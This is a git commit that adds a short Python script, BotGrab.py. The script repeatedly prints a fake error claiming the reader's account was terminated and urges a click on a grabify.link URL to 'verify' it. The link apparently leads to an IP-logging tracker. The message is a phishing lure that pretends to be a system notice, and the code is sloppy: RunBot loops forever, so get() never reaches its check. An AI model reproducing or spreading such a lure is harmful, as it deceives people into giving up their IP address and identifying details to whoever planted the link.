9d799554fa2fa506f08700ae7ef9445d2f20efda
JusticePlayz <100519630+JusticePlayz@users.noreply.github.com>
2022-04-16 10:48:38 +0530

    Add files via upload

---
+++ BotGrab.py
@@ -0,0 +1,14 @@
+
+def RunBot():
+    dispatch = True;
+    import time
+    while True:
+        time.sleep(0.6)
+        print("ERROR: a glitch has terminated your account. please click this link to verify so your account will be reinstated. Link: https://grabify.link/4XI75Z.html. id: 99203")
+        
+        
+        
+        
+def get():
+    if RunBot() == True:
+        print("Bot is running")
